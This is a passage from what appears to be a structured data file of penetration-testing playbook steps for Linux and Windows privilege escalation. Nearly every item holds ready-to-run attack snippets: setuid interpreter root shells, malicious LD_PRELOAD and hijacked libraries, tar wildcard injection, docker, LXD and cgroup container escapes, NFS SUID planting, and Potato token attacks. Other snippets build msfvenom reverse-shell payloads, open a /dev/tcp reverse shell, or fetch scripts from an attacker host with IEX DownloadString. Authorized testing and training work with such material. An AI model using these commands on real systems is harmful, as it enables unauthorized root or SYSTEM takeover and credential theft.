    ],
    "brief_description": "Writable /etc/passwd is an instant root — add a new uid=0 user. Always check /etc/sudoers.d/ as well."
  },
  {
    "id": "item-linpe-7",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.7 Linux Capabilities",
    "title": "Find and exploit binaries with dangerous Linux capabilities",
    "feasible_when": "A low-privilege shell is available; binaries with `cap_setuid`, `cap_dac_read_search`, or `cap_sys_admin` exist.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Find all capabilities ───\ngetcap -r / 2>/dev/null\n\n# ─── Dangerous capabilities reference ───\n# cap_setuid+ep        → can set UID to 0 → root\n# cap_dac_read_search  → read any file regardless of permissions\n# cap_dac_override     → write any file\n# cap_sys_admin        → extremely powerful — near root\n# cap_sys_ptrace       → attach to any process → code injection\n# cap_net_bind_service → bind ports < 1024 (lower value, less dangerous)\n# cap_sys_chroot       → chroot to any directory\n# cap_fowner           → bypass DAC on owned files\n\n# ─── Exploitation per binary ───\n\n# Python3 with cap_setuid\n/usr/bin/python3 = cap_setuid+ep\n/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n\n# Perl with cap_setuid\n/usr/bin/perl = cap_setuid+ep\nperl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'\n\n# Ruby with cap_setuid\n/usr/bin/ruby = cap_setuid+ep\nruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'\n\n# Node.js with cap_setuid\n/usr/bin/node = cap_setuid+ep\nnode -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", { stdio: [0,1,2] })'\n\n# PHP with cap_setuid\n/usr/bin/php7.4 = cap_setuid+ep\nphp -r 'posix_setuid(0); system(\"/bin/bash\");'\n\n# Vim with cap_setuid\nvim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-c\",\"reset; exec sh\")'\n\n# gdb with cap_setuid\ngdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit\n\n# tar with cap_dac_read_search\ntar czf /tmp/shadow.tar.gz /etc/shadow\ntar xzf /tmp/shadow.tar.gz -C /tmp\ncat /tmp/etc/shadow\n\n# openssl with cap_dac_read_search\nopenssl enc -in /etc/shadow 2>/dev/null\n\n# grep with cap_dac_read_search\ngrep '' /etc/shadow\ngrep '' /root/.ssh/id_rsa\n\n# tcpdump with cap_net_admin\ntcpdump -i eth0 -w /tmp/capture.pcap\n\n# ─── Add capability (if root, to create persistent vector) ───\nsetcap cap_setuid+ep /usr/bin/python3"
      }
    ],
    "brief_description": "Linux capabilities are a stealthy SUID alternative. cap_setuid+ep on any scripting interpreter = instant root."
  },
  {
    "id": "item-linpe-8",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.8 LD_PRELOAD and Library Hijacking",
    "title": "Exploit LD_PRELOAD sudo retention and shared library path hijacking",
    "feasible_when": "`sudo -l` shows `env_keep+=LD_PRELOAD`, or a SUID/root binary loads libraries from a writable directory.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Check for LD_PRELOAD in sudo ───\nsudo -l | grep LD_PRELOAD\n# Should show: env_keep+=LD_PRELOAD\n\n# Compile malicious shared lib\ncat > /tmp/pe.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setresuid(0, 0, 0);\n    setresgid(0, 0, 0);\n    system(\"/bin/bash -p\");\n}\nEOF\ngcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c\n\n# Exploit — use any allowed sudo command\nsudo LD_PRELOAD=/tmp/pe.so <ALLOWED_COMMAND>\n# Example: sudo LD_PRELOAD=/tmp/pe.so /usr/bin/find\n\n# ─── Shared library hijacking ───\n# Check what libs a SUID binary loads\nldd /path/to/suid_binary\nstrings /path/to/suid_binary | grep '\\.so'\n\n# Find missing libraries\nstrace /path/to/suid_binary 2>&1 | grep -i 'open.*lib.*No such'\n\n# Check custom rpath (if present)\nreadelf -d /path/to/suid_binary | grep 'RPATH\\|RUNPATH'\n\n# Check LD_LIBRARY_PATH\nenv | grep LD_LIBRARY_PATH\n\n# Find writable library directories in ldconfig path\ncat /etc/ld.so.conf\ncat /etc/ld.so.conf.d/*.conf\nfind / -name '*.so*' -writable 2>/dev/null\n\n# Compile malicious replacement .so\ncat > /tmp/malicious_lib.c << 'EOF'\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n    setresuid(0, 0, 0);\n    system(\"/bin/bash -p\");\n}\nEOF\ngcc -shared -fPIC -o /writable/path/<MISSING_LIB>.so /tmp/malicious_lib.c\n\n# ─── PATH hijacking for root-executed scripts ───\n# If root runs a script that calls relative commands:\n# Example: cron runs: backup.sh which calls: tar\ncat > /tmp/tar << 'EOF'\n#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\nEOF\nchmod +x /tmp/tar\nexport PATH=/tmp:$PATH"
      }
    ],
    "brief_description": "LD_PRELOAD + sudo env_keep = compile + execute. Library hijacking works when SUID binaries load from writable paths."
  },
  {
    "id": "item-linpe-9",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.9 Wildcard Injection",
    "title": "Exploit wildcard expansion in root-executed commands",
    "feasible_when": "A cron job or root-executed script uses a wildcard (`*`) with `tar`, `chown`, `chmod`, or `rsync` in a directory writable by current user.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Identify wildcard use ───\n# Look for: tar * / chown * / rsync * in cron or scripts\ncat /etc/crontab | grep '\\*'\ngrep -r '\\*' /etc/cron.d/ 2>/dev/null\npspy64  # watch for root processes using wildcards\n\n# ─── tar wildcard injection ───\n# Cron runs: cd /var/www/html && tar czf /tmp/backup.tar.gz *\ncd /var/www/html   # or wherever the wildcard applies\n\n# Create the malicious files\necho '' > '--checkpoint=1'\necho '' > '--checkpoint-action=exec=sh /tmp/r.sh'\n\ncat > /tmp/r.sh << 'EOF'\n#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\nEOF\nchmod +x /tmp/r.sh\n# Wait for cron: /tmp/rootbash -p\n\n# ─── chown wildcard injection ───\n# Cron runs: chown root:root * (in writable dir)\ntouch -- '--reference=.'\n# When chown expands *, it sees --reference=. as an argument\n# This causes chown to use . as reference for ownership change\n\n# ─── chmod wildcard injection ───\n# Cron runs: chmod 644 * (in writable dir)\ntouch -- '--reference=/etc/passwd'  # changes perms to match /etc/passwd\n\n# ─── rsync wildcard injection ───\n# Cron runs: rsync -a * /backup/ (in writable dir)\necho '' > '-e sh r.sh'\ncat > r.sh << 'EOF'\n#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\nEOF\nchmod +x r.sh"
      }
    ],
    "brief_description": "Create files whose names are command-line flags. tar --checkpoint-action is the most reliable wildcard exploit."
  },
  {
    "id": "item-linpe-10",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.10 PATH Hijacking",
    "title": "Exploit insecure PATH in SUID binaries and sudo",
    "feasible_when": "A SUID binary or sudo-allowed script calls other binaries using relative paths (no full path like /usr/bin/cat).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Find SUID binaries calling relative commands ───\nstrings /path/to/suid_binary | grep -v '/'\n# or: ltrace ./suid_binary\n# or: strace -e execve ./suid_binary 2>&1 | grep 'exec'\n\n# ─── Exploit relative command in SUID ───\n# If SUID binary calls 'cat' without full path:\ncat > /tmp/cat << 'EOF'\n#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\nEOF\nchmod +x /tmp/cat\nexport PATH=/tmp:$PATH\n./suid_binary    # triggers /tmp/cat instead of /usr/bin/cat\n/tmp/rootbash -p\n\n# ─── Exploit relative command in sudo allowed script ───\n# sudo -l shows: NOPASSWD: /opt/admin/backup.sh\n# backup.sh calls: service apache2 start\ncat > /tmp/service << 'EOF'\n#!/bin/bash\n/bin/bash -p\nEOF\nchmod +x /tmp/service\nexport PATH=/tmp:$PATH\nsudo /opt/admin/backup.sh\n\n# ─── Writable directory early in PATH ───\necho $PATH\nls -la /usr/local/bin   # check if writable\nls -la /usr/bin         # check if writable\n# Place malicious binary in early-PATH writable dir\ncat > /usr/local/bin/<COMMAND> << 'EOF'\n#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\nEOF\nchmod +x /usr/local/bin/<COMMAND>"
      }
    ],
    "brief_description": "Relative command calls in SUID binaries are hijackable via PATH prepending — use strings to find them."
  },
  {
    "id": "item-linpe-11",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.11 Docker, LXC, and Container Escapes",
    "title": "Escape Docker/LXC containers or exploit docker/lxd group membership",
    "feasible_when": "Running inside a container, or current user is member of `docker` or `lxd` group, or `/var/run/docker.sock` is accessible.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Are we in a container? ───\ncat /proc/1/cgroup | grep -i 'docker\\|lxc\\|kubepods'\nls /.dockerenv 2>/dev/null && echo 'IN DOCKER'\nhostname | grep -E '^[a-f0-9]{12}$'   # random hex hostname = docker container\ncat /proc/self/cgroup\nfind / -name 'overlay' -type d 2>/dev/null\n\n# ─── Check docker group ───\nid | grep docker\ncat /etc/group | grep docker\n\n# ─── Escape via docker group (host file system) ───\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\ndocker run -v /:/mnt --rm -it ubuntu:latest chroot /mnt /bin/bash\n\n# Read shadow\ndocker run -v /:/mnt --rm alpine cat /mnt/etc/shadow\n\n# Write SSH key\ndocker run -v /:/mnt --rm -it alpine sh -c 'echo \"<PUB_KEY>\" >> /mnt/root/.ssh/authorized_keys'\n\n# ─── Docker socket escape (/var/run/docker.sock) ───\nls -la /var/run/docker.sock\ndocker -H unix:///var/run/docker.sock images\ndocker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n# curl via socket (when docker CLI not available)\ncurl -s --unix-socket /var/run/docker.sock http://localhost/images/json\ncurl -s --unix-socket /var/run/docker.sock -X POST 'http://localhost/containers/create' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"HostConfig\":{\"Binds\":[\"/:/mnt\"],\"Privileged\":true}}'\n\n# ─── LXD group escape ───\nid | grep lxd\n# Download alpine LXD image on attacker:\ngit clone https://github.com/saghul/lxd-alpine-builder\ncd lxd-alpine-builder && bash build-alpine\n# Transfer alpine.tar.gz to target\nlxc image import /tmp/alpine.tar.gz /tmp/alpine.tar.gz.root --alias myimage 2>/dev/null\nlxc init myimage ignite -c security.privileged=true\nlxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true\nlxc start ignite\nlxc exec ignite /bin/sh\n# Now: chroot /mnt/root /bin/bash → root on host\n\n# ─── Privileged container escape (CAP_SYS_ADMIN) ───\ncap_check: cat /proc/self/status | grep CapEff\n# Decode: capsh --decode=<HEX_VALUE>\n# CAP_SYS_ADMIN = mount, nsenter, etc.\nmkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\necho '#!/bin/sh' > /cmd\necho \"id > $host_path/output\" >> /cmd\nchmod a+x /cmd\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"\ncat /output"
      }
    ],
    "brief_description": "docker group = root on host. LXD group = root on host. Docker socket access = same as docker group. Check all three."
  },
  {
    "id": "item-linpe-12",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.12 NFS No Root Squash",
    "title": "Exploit NFS exports with no_root_squash",
    "feasible_when": "`/etc/exports` contains `no_root_squash` for a share, and the share is mountable from the attacker machine.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── On target — check exports ───\ncat /etc/exports\n# Look for: /share *(rw,sync,no_root_squash)\n# no_root_squash = attacker's root UID (0) maps as root on share\n\n# ─── On attacker — mount and plant SUID shell ───\nmkdir -p /mnt/nfs_exploit\nmount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs_exploit -o nolock,vers=3\n# Verify mount\nls -la /mnt/nfs_exploit\n\n# Copy bash and set SUID (as root on attacker)\ncp /bin/bash /mnt/nfs_exploit/rootbash\nchmod 4755 /mnt/nfs_exploit/rootbash   # 4755 = SUID + 755\nls -la /mnt/nfs_exploit/rootbash       # should show: -rwsr-xr-x\n\numount /mnt/nfs_exploit\n\n# ─── On target — execute SUID shell ───\nls -la /<SHARE>/rootbash\n/<SHARE>/rootbash -p    # -p = preserve EUID (run as root)\nwhoami   # should be root\n\n# ─── Alternative: plant reverse shell ───\ncat > /mnt/nfs_exploit/revsh.sh << 'EOF'\n#!/bin/bash\nbash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\nEOF\nchmod +x /mnt/nfs_exploit/revsh.sh\n# Set SUID on bash copy instead and call revsh.sh from it\n\n# ─── Alternative: root_squash bypass via UID match ───\n# If no_root_squash NOT set but share maps files as specific UID:\nid  # get target user's UID\n# On attacker: create user with same UID\nuseradd -u <TARGET_UID> fakeuser\nsu fakeuser\n# Now access share as that user"
      }
    ],
    "brief_description": "no_root_squash = the attacker's root user is treated as root on the share. Plant SUID /bin/bash and execute with -p."
  },
  {
    "id": "item-linpe-13",
    "phase": "8. Privilege Escalation — Linux",
    "step": "8.13 Miscellaneous Linux PrivEsc",
    "title": "Additional Linux PrivEsc vectors",
    "feasible_when": "Standard vectors have been exhausted; targeting less common misconfigurations.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Readable /etc/shadow ───\nls -la /etc/shadow\ncat /etc/shadow   # if readable\ncat /etc/shadow | grep -v '!\\|*'   # active hashed accounts\n# Crack with hashcat:\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt   # SHA-512\nhashcat -m 500  hash.txt /usr/share/wordlists/rockyou.txt   # MD5\n\n# ─── .bash_profile / .bashrc / .profile hijack ───\n# If user has sudo with NOPASSWD and you can write their .bashrc:\necho 'cp /bin/bash /tmp/r && chmod +s /tmp/r' >> /home/<USER>/.bashrc\n# Wait for user to login or run sudo with env inherit\n\n# ─── Ansible / Salt / Chef / Puppet ───\nfind / -name 'ansible.cfg' -o -name '*.playbook' 2>/dev/null | head -5\nfind / -name 'id_rsa' -path '*/ansible/*' 2>/dev/null\n\n# ─── Weak file permissions on private keys ───\nfind / -name 'id_rsa' -readable 2>/dev/null\nfind / -name '*.pem' -readable 2>/dev/null | xargs grep -l 'PRIVATE KEY' 2>/dev/null\n\n# ─── Readable backup files ───\nfind / -name '*.bak' -o -name '*.backup' -o -name '*.old' 2>/dev/null | head -20\n\n# ─── World-writable Python/Perl libraries used by SUID ───\nfind / -writable -name '*.py' -o -writable -name '*.pl' 2>/dev/null | head -10\n\n# ─── /etc/passwd writable check (2nd method) ───\nopenssl passwd -1 -salt user password123\n# $1$user$<HASH>\n# Add user line:\necho 'root2:$1$user$<HASH>:0:0:pwned:/root:/bin/bash' >> /etc/passwd\n\n# ─── Screen 4.5.0 privesc (CVE-2017-5618) ───\nscreen --version | grep 'Screen version 4.5.0'\n# exploit: https://www.exploit-db.com/exploits/41154\n\n# ─── MySQL running as root → UDF ───\nps aux | grep mysql\ncat /etc/mysql/my.cnf | grep 'user'\n# If MySQL runs as root, UDF exploitation gives root shell\n\n# ─── Tmux / Screen sessions running as root ───\ntmux ls 2>/dev/null\nscreen -ls 2>/dev/null\n# If root has session: attach to it\ntmux attach-session -t <SESSION_NAME>\n\n# ─── /proc/sysrq-trigger ───\ncat /proc/sys/kernel/sysrq\n# If enabled and writable:\necho b > /proc/sysrq-trigger   # reboot (useful in some CTF scenarios)\n\n# ─── logrotate PrivEsc ───\n# If logrotate runs as root and log files are in writable directory\n# CVE-2016-1247 — Nginx log file symlink\n# Requires: logrotate < 3.15.1"
      }
    ],
    "brief_description": "Miscellaneous vectors: readable shadow, SSH key permissions, tmux sessions as root, MySQL running as root for UDF RCE."
  },

  // ============================================================
  // PHASE 9 — PRIVILEGE ESCALATION: WINDOWS
  // ============================================================
  {
    "id": "item-winpe-1",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.1 Automated Enumeration",
    "title": "Transfer and run Windows PrivEsc enumeration tools",
    "feasible_when": "A shell has been obtained on a Windows target and file transfer is possible.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Transfer methods ───\n# HTTP server on attacker:\npython3 -m http.server 80\n\n# PowerShell download\n(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/winPEASx64.exe', 'C:\\Windows\\Temp\\wp.exe')\nInvoke-WebRequest -Uri http://<ATTACKER_IP>/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe\n\n# certutil (always available)\ncertutil -urlcache -f http://<ATTACKER_IP>/winPEASx64.exe C:\\Windows\\Temp\\wp.exe\n\n# SMB\n# On attacker: impacket-smbserver share . -smb2support\ncopy \\\\<ATTACKER_IP>\\share\\winPEASx64.exe C:\\Windows\\Temp\\wp.exe\n\n# ─── WinPEAS ───\nC:\\Windows\\Temp\\wp.exe\nC:\\Windows\\Temp\\wp.exe quiet         # less noisy\nC:\\Windows\\Temp\\wp.exe systeminfo     # only system info\nC:\\Windows\\Temp\\wp.exe userinfo       # only user info\nC:\\Windows\\Temp\\wp.exe servicesinfo   # only services\nC:\\Windows\\Temp\\wp.exe | Out-File -Encoding ASCII C:\\Windows\\Temp\\wp_out.txt\n\n# Colors: Red = high priority | Yellow = interesting | Green = good to know\n\n# ─── Seatbelt (comprehensive recon) ───\n.\\Seatbelt.exe -group=all\n.\\Seatbelt.exe -group=system\n.\\Seatbelt.exe -group=user\n.\\Seatbelt.exe -group=misc\n.\\Seatbelt.exe NonstandardProcesses\n.\\Seatbelt.exe TokenPrivileges\n.\\Seatbelt.exe CredEnum\n.\\Seatbelt.exe WindowsCredentialFiles\n.\\Seatbelt.exe DotNet\n\n# ─── PowerUp (PS-based, no binary drop) ───\nIEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')\nInvoke-AllChecks\nInvoke-AllChecks | Out-File -Encoding ASCII C:\\Windows\\Temp\\powerup.txt\nGet-ServiceUnquoted\nGet-ModifiableServiceFile\nGet-ModifiableService\nFind-ProcessDLLHijack\nFind-PathDLLHijack\nGet-RegistryAlwaysInstallElevated\nGet-UnattendedInstallFile\nGet-Webconfig\n\n# ─── PrivescCheck (pure PS, AMSI-safe) ───\nIEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PrivescCheck.ps1')\nInvoke-PrivescCheck -Extended -Audit | Out-File -Encoding ASCII C:\\Windows\\Temp\\privesccheck.txt\n\n# ─── AccessChk (Sysinternals — check permissions) ───\n.\\accesschk.exe /accepteula\n.\\accesschk.exe /accepteula -uwcqv 'Authenticated Users' * /svc\n.\\accesschk.exe /accepteula -uwdq 'C:\\Program Files\\'\n.\\accesschk.exe /accepteula -uwdq 'C:\\Windows\\Temp\\'\n.\\accesschk.exe /accepteula -uwdq 'Everyone' C:\\"
      }
    ],
    "brief_description": "Run WinPEAS and PowerUp immediately — both are required as they catch different vectors. Run Seatbelt for detailed recon."
  },
  {
    "id": "item-winpe-2",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.2 Token Impersonation (Potato Attacks)",
    "title": "Exploit SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege",
    "feasible_when": "`whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` as Enabled — common for IIS AppPool, NETWORK SERVICE, and MSSQL service accounts.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Check privileges ───\nwhoami /priv\n# Look for: SeImpersonatePrivilege | SeAssignPrimaryTokenPrivilege\n# Both allow token impersonation → path to SYSTEM\n\n# ─── Determine Windows version (affects which Potato works) ───\nsysteminfo | findstr /i 'OS Name\\|OS Version\\|Build'\n\n# ─── PrintSpoofer (Win 10 / Server 2019) ───\n.\\PrintSpoofer64.exe -i -c cmd                  # interactive cmd as SYSTEM\n.\\PrintSpoofer64.exe -i -c powershell            # interactive PS as SYSTEM\n.\\PrintSpoofer64.exe -c \"C:\\Windows\\Temp\\rev.exe\"  # execute payload as SYSTEM\n# 32-bit version:\n.\\PrintSpoofer32.exe -i -c cmd\n\n# ─── GodPotato (.NET 2/3.5/4) — Win Server 2012+ / Win 8+ ───\n.\\GodPotato-NET2.exe -cmd \"cmd /c whoami\"\n.\\GodPotato-NET35.exe -cmd \"cmd /c whoami\"\n.\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"\n.\\GodPotato-NET4.exe -cmd \"cmd /c C:\\Windows\\Temp\\rev.exe\"\n# Reverse shell:\n.\\GodPotato-NET4.exe -cmd \"cmd /c powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/rev.ps1')\"\n\n# ─── JuicyPotato (Win < Server 2019, Win < 10 1809) ───\n.\\JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\rev.exe -t * -c {<CLSID>}\n# CLSID list: https://github.com/ohpe/juicy-potato/tree/master/CLSID\n# Common CLSIDs:\n#   Win 10 1809:  {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} — wuauserv\n#   Win Server 2016: {5B3E6773-3A99-4A3D-8096-7765DD11785C} — DCOM server\n.\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a '/c net user hacker Password123! /add' -t * -c {<CLSID>}\n.\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a '/c net localgroup administrators hacker /add' -t * -c {<CLSID>}\n\n# ─── SweetPotato (combines multiple techniques) ───\n.\\SweetPotato.exe -e EfsRpc -p C:\\Windows\\Temp\\rev.exe\n.\\SweetPotato.exe -e PrintSpoofer -p C:\\Windows\\Temp\\rev.exe\n.\\SweetPotato.exe -e TokenImpersonation -p C:\\Windows\\Temp\\rev.exe\n\n# ─── RoguePotato ───\n# On attacker: socat TCP-LISTEN:135,reuseaddr,fork TCP:<TARGET_IP>:9999\n.\\RoguePotato.exe -r <ATTACKER_IP> -e C:\\Windows\\Temp\\rev.exe -l 9999\n\n# ─── Verify SYSTEM ───\nwhoami   # should return: nt authority\\system"
      }
    ],
    "brief_description": "SeImpersonatePrivilege on IIS/MSSQL accounts = always try Potato attacks first. GodPotato and PrintSpoofer work on modern systems."
  },
  {
    "id": "item-winpe-3",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.3 Unquoted Service Paths",
    "title": "Find and exploit unquoted service paths with spaces",
    "feasible_when": "Services with unquoted paths containing spaces exist and a writable directory is along that path.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Find unquoted service paths ───\nwmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v '\"' | findstr /i /v 'c:\\windows\\\\'\nGet-CimInstance -ClassName Win32_Service | Where-Object {$_.PathName -notmatch '\"' -and $_.PathName -match ' ' -and $_.PathName -notmatch 'C:\\\\Windows\\\\System32'} | Select-Object Name, PathName, StartMode\n\n# PowerUp\nGet-ServiceUnquoted\n\n# ─── Understand Windows path resolution ───\n# Service path: C:\\Program Files\\My App\\sub dir\\service.exe\n# Windows tries IN ORDER:\n#   1. C:\\Program.exe\n#   2. C:\\Program Files\\My.exe\n#   3. C:\\Program Files\\My App\\sub.exe\n#   4. C:\\Program Files\\My App\\sub dir\\service.exe\n\n# ─── Find writable directory along the path ───\nicacls \"C:\\Program Files\\\" 2>$null\nicacls \"C:\\Program Files\\<SERVICE_DIR>\\\" 2>$null\n.\\accesschk.exe /accepteula -uwdq 'Everyone' \"C:\\Program Files\\\"\n.\\accesschk.exe /accepteula -uwdq 'Authenticated Users' \"C:\\Program Files\\\"\n.\\accesschk.exe /accepteula -uwdq 'BUILTIN\\Users' \"C:\\Program Files\\\"\n\n# ─── Exploit ───\n# Generate payload\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o <EXPLOITABLE_NAME>.exe\n# Transfer and place\ncopy C:\\Windows\\Temp\\<EXPLOITABLE_NAME>.exe \"C:\\<WRITABLE_PATH>\\<EXPLOITABLE_NAME>.exe\"\n# Example: copy rev.exe \"C:\\Program Files\\Vuln.exe\"\n\n# Stop and start service (requires SERVICE_STOP rights or restart)\nsc stop <SERVICE_NAME>\nsc start <SERVICE_NAME>\n# Or if no stop rights: reboot\nshutdown /r /t 0"
      }
    ],
    "brief_description": "Unquoted paths with spaces allow DLL/EXE injection at each space-containing directory. icacls each directory along the path."
  },
  {
    "id": "item-winpe-4",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.4 Weak Service Permissions",
    "title": "Exploit weak service binary or configuration permissions",
    "feasible_when": "Current user has `SERVICE_CHANGE_CONFIG`, `(M)`, or `(F)` access on a service or its binary path.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Check service permissions ───\n.\\accesschk.exe /accepteula -uwcqv 'Everyone' * /svc\n.\\accesschk.exe /accepteula -uwcqv 'Authenticated Users' * /svc\n.\\accesschk.exe /accepteula -uwcqv '<CURRENT_USER>' * /svc\n.\\accesschk.exe /accepteula -uwcqv 'BUILTIN\\Users' * /svc\n.\\accesschk.exe /accepteula -ucqv <SERVICE_NAME>\n\n# PowerShell check\nGet-ACL -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<SERVICE_NAME>' | Format-List\n\n# ─── Query service config ───\nsc qc <SERVICE_NAME>\nsc query <SERVICE_NAME>\n\n# ─── Exploit: modify binary path (if SERVICE_CHANGE_CONFIG) ───\n# Add new admin user\nsc config <SERVICE_NAME> binpath= \"cmd /c net user hacker Password123! /add\"\nsc stop <SERVICE_NAME>; sc start <SERVICE_NAME>\n# Verify\nnet user hacker\n\n# Make hacker an admin\nsc config <SERVICE_NAME> binpath= \"cmd /c net localgroup administrators hacker /add\"\nsc stop <SERVICE_NAME>; sc start <SERVICE_NAME>\n\n# Execute reverse shell\nsc config <SERVICE_NAME> binpath= \"C:\\Windows\\Temp\\rev.exe\"\nsc stop <SERVICE_NAME>; sc start <SERVICE_NAME>\n\n# ─── Exploit: replace service binary (if writable binary) ───\nicacls 'C:\\path\\to\\service.exe'\n# Look for (M) or (F) access for current user\n# Backup original\ncopy 'C:\\path\\to\\service.exe' C:\\Windows\\Temp\\service.exe.bak\n# Replace with payload\ncopy /y C:\\Windows\\Temp\\rev.exe 'C:\\path\\to\\service.exe'\nsc stop <SERVICE_NAME>; sc start <SERVICE_NAME>\n\n# ─── Exploit: writable service registry key ───\nGet-ACL 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<SERVICE_NAME>' | fl *\nreg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\<SERVICE_NAME>' /v ImagePath /t REG_EXPAND_SZ /d 'C:\\Windows\\Temp\\rev.exe' /f\n\n# ─── Restore if needed ───\nsc config <SERVICE_NAME> binpath= \"C:\\path\\to\\original\\service.exe\"\ncopy /y C:\\Windows\\Temp\\service.exe.bak 'C:\\path\\to\\service.exe'"
      }
    ],
    "brief_description": "Modifiable service configs allow redirecting the binary path to a reverse shell. Always backup before overwriting."
  },
  {
    "id": "item-winpe-5",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.5 AlwaysInstallElevated",
    "title": "Exploit AlwaysInstallElevated to run MSI as SYSTEM",
    "feasible_when": "Both HKLM and HKCU `AlwaysInstallElevated` registry values are set to 1.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Check both keys (BOTH must be 1 for exploitation) ───\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>$null\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>$null\n# Both should return: AlwaysInstallElevated    REG_DWORD    0x1\n\n# PowerUp\nGet-RegistryAlwaysInstallElevated\n\n# ─── Generate MSI payload ───\n# On attacker:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o rev.msi\nmsfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o rev32.msi\n\n# Alternative — PowerUp MSI (adds local admin)\nWrite-UserAddMSI   # creates UserAdd.msi in current dir\n\n# ─── Execute (always runs as SYSTEM when policy is set) ───\nmsiexec /quiet /qn /i C:\\Windows\\Temp\\rev.msi\nmsiexec /quiet /qn /i C:\\Windows\\Temp\\rev.msi /l*v C:\\Windows\\Temp\\msi.log\n# /quiet = no UI, /qn = no UI at all\n\n# ─── Verify privilege ───\n# Listener should receive SYSTEM shell"
      }
    ],
    "brief_description": "When both HKLM and HKCU AlwaysInstallElevated = 1, any MSI runs with SYSTEM privileges regardless of current user."
  },
  {
    "id": "item-winpe-6",
    "phase": "9. Privilege Escalation — Windows",
    "step": "9.6 DLL Hijacking",
    "title": "Identify missing DLLs and plant malicious replacements",
    "feasible_when": "A service or application loads a missing DLL or loads from a directory writable by the current user (identified via Process Monitor or Seatbelt).",
    "snippets": [
      {
        "lang": "powershell",
